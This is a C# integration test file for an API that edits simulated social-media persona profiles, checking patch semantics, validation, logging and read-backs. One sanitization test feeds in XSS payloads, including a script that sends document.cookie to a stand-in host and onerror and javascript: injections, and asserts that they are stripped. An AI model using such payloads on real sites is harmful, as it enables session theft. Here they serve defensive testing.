namespace Pulse.WebApi.Tests.Features.Social.PersonaAdmin;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Azure;
using FluentAssertions;
using Microsoft.EntityFrameworkCore;
using Pulse.WebApi.Data.Entities;
using Pulse.WebApi.Features.Media;
using Pulse.WebApi.Features.Social.PersonaAdmin;
using Pulse.WebApi.Tests.Data;
using Pulse.WebApi.Tests.Features.ExerciseConfiguration.Lifecycle;
using Xunit;
using static Pulse.WebApi.Tests.Features.Social.PersonaAdmin.PersonaAdminHttp;

/// <summary>
/// <c>PATCH /api/staff/personas/{personaId}</c> end to end (demo-polish PE-BE, story 21): the merge-patch matrix,
/// the immutable-field 400s, sanitization, bounds, the in-scope-image rule for a same-exercise video, the signed
/// read-back (and its degradation when signing fails), the participant and staff reads after an edit, no server
/// telemetry (DP-9), and that the per-exercise handle index is untouched. Real <c>Program</c> pipeline, real tokens,
/// real SQL. The cross-exercise cases are in <see cref="PersonaAdminIsolationTests"/>; the caller matrix is in
/// <see cref="PersonaAdminAuthorizationTests"/>.
/// </summary>
[Collection(MsSqlCollection.Name)]
public sealed class PersonaAdminEndpointTests
{
    private readonly PersonaAdminSeeder _seed;

    public PersonaAdminEndpointTests(MsSqlContainerFixture fixture) => _seed = new PersonaAdminSeeder(fixture);

    [RequiresDockerFact]
    public async Task Controller_PatchesEveryField_Returns200WithTheUpdatedStaffDto_AndPersists()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var before = await _seed.ReadPersonaAsync(personaId);
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var banner = await _seed.SeedMediaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, new
        {
            displayName = "Fulton County EM",
            bio = "Official updates from Fulton County Emergency Management.",
            location = "Fulton, OH",
            verified = false,
            avatarMediaId = avatar.ToString(),
            bannerMediaId = banner.ToString(),
        });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var body = await ReadObjectAsync(response);
        body.GetProperty("id").GetString().Should().Be(personaId.ToString());
        body.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
        body.GetProperty("initials").GetString().Should().Be("FC", "derived from the NEW display name");
        body.GetProperty("bio").GetString().Should().Be("Official updates from Fulton County Emergency Management.");
        body.GetProperty("location").GetString().Should().Be("Fulton, OH");
        body.GetProperty("verified").GetBoolean().Should().BeFalse();
        body.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar), "the read-back is signed (BP's GetStaffPersonaAsync)");
        body.GetProperty("bannerUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(banner));
        body.GetProperty("handle").GetString().Should().Be(before.Handle, "handles are not editable (plan §9)");
        body.GetProperty("kind").GetString().Should().Be("org");
        body.GetProperty("personaType").GetString().Should().Be("agency", "the staff shape keeps the archetype");
        body.GetProperty("exerciseId").GetString().Should().Be(exercise.Id.ToString());
        PropertyNames(body).Should().NotContain("castable").And.NotContain("avatarMediaId").And.NotContain("bannerMediaId");

        var after = await _seed.ReadPersonaAsync(personaId);
        after.DisplayName.Should().Be("Fulton County EM");
        after.Bio.Should().Be("Official updates from Fulton County Emergency Management.");
        after.Location.Should().Be("Fulton, OH");
        after.Verified.Should().BeFalse();
        after.AvatarMediaId.Should().Be(avatar);
        after.BannerMediaId.Should().Be(banner);
        AssertImmutableUnchanged(before, after);
    }

    [RequiresDockerFact]
    public async Task AbsentFields_AreLeftUnchanged()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var banner = await _seed.SeedMediaAsync(exercise.Id);
        var personaId = await _seed.SeedPersonaAsync(exercise.Id, avatar, banner);
        var before = await _seed.ReadPersonaAsync(personaId);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, new { displayName = "Renamed only" });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var after = await _seed.ReadPersonaAsync(personaId);
        after.DisplayName.Should().Be("Renamed only");
        after.Bio.Should().Be(before.Bio, "absent = unchanged (RFC 7396)");
        after.Location.Should().Be(before.Location);
        after.Verified.Should().Be(before.Verified);
        after.AvatarMediaId.Should().Be(avatar);
        after.BannerMediaId.Should().Be(banner);
        AssertImmutableUnchanged(before, after);

        var body = await ReadObjectAsync(response);
        body.GetProperty("bio").GetString().Should().Be(PersonaAdminSeeder.OriginalBio);
        body.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar));
    }

    [RequiresDockerFact]
    public async Task Null_ClearsBioLocationAvatarAndBanner_AndTheMediaRowsSurvive()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var banner = await _seed.SeedMediaAsync(exercise.Id);
        var personaId = await _seed.SeedPersonaAsync(exercise.Id, avatar, banner);
        var before = await _seed.ReadPersonaAsync(personaId);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(
            client, personaId, """{ "bio": null, "location": null, "avatarMediaId": null, "bannerMediaId": null }""");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var body = await ReadObjectAsync(response);
        PropertyNames(body).Should().NotContain(["bio", "location", "avatarUrl", "bannerUrl"], "cleared fields are omitted, never emitted as null");

        var after = await _seed.ReadPersonaAsync(personaId);
        after.Bio.Should().BeNull();
        after.Location.Should().BeNull();
        after.AvatarMediaId.Should().BeNull();
        after.BannerMediaId.Should().BeNull();
        after.DisplayName.Should().Be(before.DisplayName);
        after.Verified.Should().Be(before.Verified);

        (await _seed.MediaExistsAsync(avatar)).Should().BeTrue("clearing an avatar only drops the reference; nothing is hard-deleted (XC-010)");
        (await _seed.MediaExistsAsync(banner)).Should().BeTrue();
    }

    [RequiresDockerTheory]
    [InlineData("""{ "displayName": null }""", PersonaAdminMessages.DisplayNameNull)]
    [InlineData("""{ "verified": null }""", PersonaAdminMessages.VerifiedNull)]
    [InlineData("""{ "bio": "ok", "verified": null }""", PersonaAdminMessages.VerifiedNull)]
    public async Task Null_OnDisplayNameOrVerified_Returns400_AndChangesNothing(string json, string expected)
    {
        await AssertRefused400Async(json, expected);
    }

    [RequiresDockerTheory]
    [InlineData("handle")]
    [InlineData("kind")]
    [InlineData("personaType")]
    [InlineData("exerciseId")]
    public async Task ImmutableField_Returns400_AndChangesNothing(string field)
    {
        // Sent next to a valid change, so a silently-ignoring implementation would 200 and rename the persona.
        var json = $$"""{ "displayName": "Should not apply", "{{field}}": "{{Guid.NewGuid()}}" }""";

        await AssertRefused400Async(json, PersonaAdminMessages.CannotBeChanged(field));
    }

    [RequiresDockerTheory]
    [InlineData("""{ "avatarUrl": "https://evil.example/x.png" }""", "avatarUrl")]
    [InlineData("""{ "castable": true }""", "castable")]
    [InlineData("""{ "displayName": "x", "id": "abc" }""", "id")]
    public async Task UnknownField_Returns400_AndChangesNothing(string json, string field)
    {
        await AssertRefused400Async(json, PersonaAdminMessages.UnknownField(field));
    }

    [RequiresDockerTheory]
    [InlineData("")]
    [InlineData("not json")]
    [InlineData("{ \"displayName\": ")]
    [InlineData("[]")]
    [InlineData("null")]
    public async Task MissingOrMalformedOrNonObjectBody_Returns400_AndChangesNothing(string json)
    {
        await AssertRefused400Async(json, PersonaAdminMessages.BodyNotObject);
    }

    [RequiresDockerFact]
    public async Task OversizedBody_Returns400_AndChangesNothing()
    {
        var json = JsonSerializer.Serialize(new { bio = new string('b', PersonaAdminEndpoints.MaxBodyBytes) });

        await AssertRefused400Async(json, PersonaAdminMessages.BodyTooLarge);
    }

    [RequiresDockerTheory]
    [InlineData("displayName", 101, PersonaAdminMessages.DisplayNameLength)]
    [InlineData("bio", 513, PersonaAdminMessages.BioLength)]
    [InlineData("location", 101, PersonaAdminMessages.LocationLength)]
    public async Task OverlongText_Returns400_AndChangesNothing(string field, int length, string expected)
    {
        var json = JsonSerializer.Serialize(new Dictionary<string, string> { [field] = new string('x', length) });

        await AssertRefused400Async(json, expected);
    }

    [RequiresDockerFact]
    public async Task TextAtItsBounds_IsAccepted_AndStoredWhole()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, new
        {
            displayName = new string('d', 100),
            bio = new string('b', 512),
            location = new string('l', 100),
        });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var after = await _seed.ReadPersonaAsync(personaId);
        after.DisplayName.Should().HaveLength(100);
        after.Bio.Should().HaveLength(512);
        after.Location.Should().HaveLength(100);
    }

    [RequiresDockerFact]
    public async Task ScriptInBio_IsStripped_BeforeItIsStoredOrReturned()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, new
        {
            displayName = "<b>Fulton</b> County EM",
            bio = "<script>fetch('https://evil.example/'+document.cookie)</script>Shelter at Fulton High. <img src=x onerror=alert(1)>",
            location = "<a href=\"javascript:alert(1)\">Fulton</a>, OH",
        });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var after = await _seed.ReadPersonaAsync(personaId);
        after.DisplayName.Should().Be("Fulton County EM");
        after.Bio.Should().Be("Shelter at Fulton High.", "NFR-004: stripped (never encoded), so a stored script can execute nowhere");
        after.Location.Should().Be("Fulton, OH");

        var raw = await response.Content.ReadAsStringAsync();
        raw.Should().NotContain("script").And.NotContain("onerror").And.NotContain("javascript:");
    }

    [RequiresDockerFact]
    public async Task EmptyPatch_Returns200_AndChangesNothing()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var before = await _seed.ReadPersonaAsync(personaId);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, "{}");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await ReadObjectAsync(response)).GetProperty("displayName").GetString().Should().Be(before.DisplayName);
        AssertEditableUnchanged(before, await _seed.ReadPersonaAsync(personaId));
    }

    [RequiresDockerFact]
    public async Task PlainApplicationJson_IsAccepted_LikeMergePatchJson()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, """{ "verified": false }""", contentType: "application/json");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await _seed.ReadPersonaAsync(personaId)).Verified.Should().BeFalse();
    }

    [RequiresDockerTheory]
    [InlineData("avatarMediaId", PersonaAdminMessages.AvatarMediaNotFound)]
    [InlineData("bannerMediaId", PersonaAdminMessages.BannerMediaNotFound)]
    public async Task SameExerciseVideo_IsNotAnImage_Returns400_WithTheUnknownIdText_AndChangesNothing(string field, string expected)
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var before = await _seed.ReadPersonaAsync(personaId);
        var video = await _seed.SeedMediaAsync(exercise.Id, MediaKinds.Video);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var asVideo = await PatchAsync(client, personaId, $$"""{ "displayName": "Should not apply", "{{field}}": "{{video}}" }""");
        var asUnknown = await PatchAsync(client, personaId, $$"""{ "{{field}}": "{{Guid.NewGuid()}}" }""");

        asVideo.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        asUnknown.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await ReadMessageAsync(asVideo)).Should().Be(expected);
        (await asVideo.Content.ReadAsStringAsync()).Should().Be(await asUnknown.Content.ReadAsStringAsync());
        AssertEditableUnchanged(before, await _seed.ReadPersonaAsync(personaId));
    }

    [RequiresDockerFact]
    public async Task SuccessfulEdit_WritesNoTelemetry_AndLogsFieldNamesNeverValues()
    {
        // DP-9: the console emits the one steering_action (persona_edit); a server event would double-count it.
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        const string secretishBio = "Distinctive bio text 7f3a91 that must not reach any log line.";
        var response = await PatchAsync(client, personaId, new { bio = secretishBio, verified = false });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await _seed.CountTelemetryAsync(exercise.Id)).Should().Be(0, "PE-BE emits no telemetry (DP-9)");

        var editLog = factory.Logs.Entries
            .Where(entry => entry.Category == typeof(PersonaProfileEditService).FullName)
            .Should().ContainSingle("one operational record per edit").Subject;
        editLog.Message.Should().Contain(personaId.ToString()).And.Contain("bio").And.Contain("verified");
        factory.Logs.Entries.Should().NotContain(entry => entry.Message.Contains("7f3a91"), "field values are never logged");
    }

    [RequiresDockerFact]
    public async Task EditIsVisible_OnTheNextParticipantAndStaffPersonaRead_AndTheParticipantShapeStaysNarrow()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var banner = await _seed.SeedMediaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);
        var viewerPersona = await _seed.SeedPersonaAsync(exercise.Id);
        var participant = await _seed.SeedParticipantSessionAsync(exercise.Id, viewerPersona);

        await using var factory = _seed.CreateFactory();
        using var staffClient = factory.CreateClientFor(exercise.Host, controller);
        using var participantClient = factory.CreateClientFor(exercise.Host, participant);

        var response = await PatchAsync(staffClient, personaId, new
        {
            displayName = "Fulton County EM",
            bio = "Official updates.",
            location = "Fulton, OH",
            verified = false,
            avatarMediaId = avatar.ToString(),
            bannerMediaId = banner.ToString(),
        });
        response.StatusCode.Should().Be(HttpStatusCode.OK);

        var seenByParticipant = (await ReadPersonaFromListAsync(participantClient, personaId))!.Value;
        seenByParticipant.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
        seenByParticipant.GetProperty("bio").GetString().Should().Be("Official updates.");
        seenByParticipant.GetProperty("location").GetString().Should().Be("Fulton, OH");
        seenByParticipant.GetProperty("verified").GetBoolean().Should().BeFalse("the trust mark participants see follows the edit");
        seenByParticipant.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar));
        seenByParticipant.GetProperty("bannerUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(banner));
        PropertyNames(seenByParticipant).Should().NotContain("personaType", "SOC-052/D1-008: never on the participant shape")
            .And.NotContain("castable");

        var seenByStaff = (await ReadPersonaFromListAsync(staffClient, personaId))!.Value;
        seenByStaff.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
        seenByStaff.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar));
        seenByStaff.GetProperty("personaType").GetString().Should().Be("agency");
        PropertyNames(seenByStaff).Should().NotContain("castable");
    }

    [RequiresDockerFact]
    public async Task SigningFailure_DegradesTheReadBack_UrlsOmitted_Never500_AndTheEditStillCommits()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var banner = await _seed.SeedMediaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        foreach (var failure in new Exception[]
        {
            new MediaStoreUnavailableException(),
            new RequestFailedException(403, "This request is not authorized to perform this operation using this permission."),
        })
        {
            await using var factory = _seed.CreateFactory(signerFailure: failure);
            using var client = factory.CreateClientFor(exercise.Host, controller);

            var response = await PatchAsync(client, personaId, new
            {
                displayName = $"Edited during a storage outage ({failure.GetType().Name})",
                avatarMediaId = avatar.ToString(),
                bannerMediaId = banner.ToString(),
            });

            response.StatusCode.Should().Be(HttpStatusCode.OK, $"a {failure.GetType().Name} while signing must degrade, never 500");
            var body = await ReadObjectAsync(response);
            PropertyNames(body).Should().NotContain(["avatarUrl", "bannerUrl"], "the URLs are omitted when they cannot be minted");
            body.GetProperty("displayName").GetString().Should().StartWith("Edited during a storage outage");

            var after = await _seed.ReadPersonaAsync(personaId);
            after.AvatarMediaId.Should().Be(avatar, "the edit commits; only the URL in the read-back is lost");
            after.BannerMediaId.Should().Be(banner);
        }
    }

    [RequiresDockerFact]
    public async Task BeforeStartEx_TheEditStillWorks_StaffRoutesAreNotLifecycleGated()
    {
        // S1 seeds persona profiles before the exercise goes live.
        var exercise = await _seed.SeedExerciseAsync(status: "build");
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, new { location = "Fulton, OH" });

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await _seed.ReadPersonaAsync(personaId)).Location.Should().Be("Fulton, OH");
    }

    [RequiresDockerFact]
    public async Task HandleUniqueness_IsUntouched_AnotherPersonasHandleIsRefused_AndTheIndexStillHolds()
    {
        var exercise = await _seed.SeedExerciseAsync();
        var taken = $"FulcoEM_{Guid.NewGuid():N}"[..20];
        var owner = await _seed.SeedPersonaAsync(exercise.Id, handle: taken);
        var personaId = await _seed.SeedPersonaAsync(exercise.Id);
        var before = await _seed.ReadPersonaAsync(personaId);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var refused = await PatchAsync(client, personaId, new { handle = taken });
        refused.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await ReadMessageAsync(refused)).Should().Be(PersonaAdminMessages.CannotBeChanged("handle"));

        // A display name equal to another persona's handle is just a display name; handles never move.
        var renamed = await PatchAsync(client, personaId, new { displayName = taken });
        renamed.StatusCode.Should().Be(HttpStatusCode.OK);

        (await _seed.ReadPersonaAsync(personaId)).Handle.Should().Be(before.Handle);
        (await _seed.ReadPersonaAsync(owner)).Handle.Should().Be(taken);

        // The unique (ExerciseId, Handle) index is still enforced after the edits.
        await using var context = _seed.CreateContext();
        context.Personas.Add(new Persona
        {
            Id = Guid.NewGuid(),
            ExerciseId = exercise.Id,
            DisplayName = "Duplicate",
            Handle = taken.ToUpperInvariant(),
            Kind = "human",
        });
        var duplicate = async () => await context.SaveChangesAsync();
        await duplicate.Should().ThrowAsync<DbUpdateException>("IX_Personas_ExerciseId_Handle is unique and case-insensitive");
    }

    private async Task AssertRefused400Async(string json, string expectedMessage)
    {
        var exercise = await _seed.SeedExerciseAsync();
        var avatar = await _seed.SeedMediaAsync(exercise.Id);
        var personaId = await _seed.SeedPersonaAsync(exercise.Id, avatarMediaId: avatar);
        var before = await _seed.ReadPersonaAsync(personaId);
        var controller = await _seed.SeedControllerSessionAsync(exercise.Id);

        await using var factory = _seed.CreateFactory();
        using var client = factory.CreateClientFor(exercise.Host, controller);

        var response = await PatchAsync(client, personaId, json);

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await ReadMessageAsync(response)).Should().Be(expectedMessage);
        var after = await _seed.ReadPersonaAsync(personaId);
        AssertEditableUnchanged(before, after);
        AssertImmutableUnchanged(before, after);
    }

    private static void AssertEditableUnchanged(Persona before, Persona after)
    {
        after.DisplayName.Should().Be(before.DisplayName, "a refused patch changes nothing");
        after.Bio.Should().Be(before.Bio);
        after.Location.Should().Be(before.Location);
        after.Verified.Should().Be(before.Verified);
        after.AvatarMediaId.Should().Be(before.AvatarMediaId);
        after.BannerMediaId.Should().Be(before.BannerMediaId);
    }

    private static void AssertImmutableUnchanged(Persona before, Persona after)
    {
        after.Handle.Should().Be(before.Handle);
        after.Kind.Should().Be(before.Kind);
        after.PersonaType.Should().Be(before.PersonaType);
        after.ExerciseId.Should().Be(before.ExerciseId);
        after.Castable.Should().Be(before.Castable);
        after.AudienceBand.Should().Be(before.AudienceBand);
        after.AudienceMagnitude.Should().Be(before.AudienceMagnitude);
        after.JoinedAt.Should().Be(before.JoinedAt);
        after.PersonaTemplateId.Should().Be(before.PersonaTemplateId);
    }
}
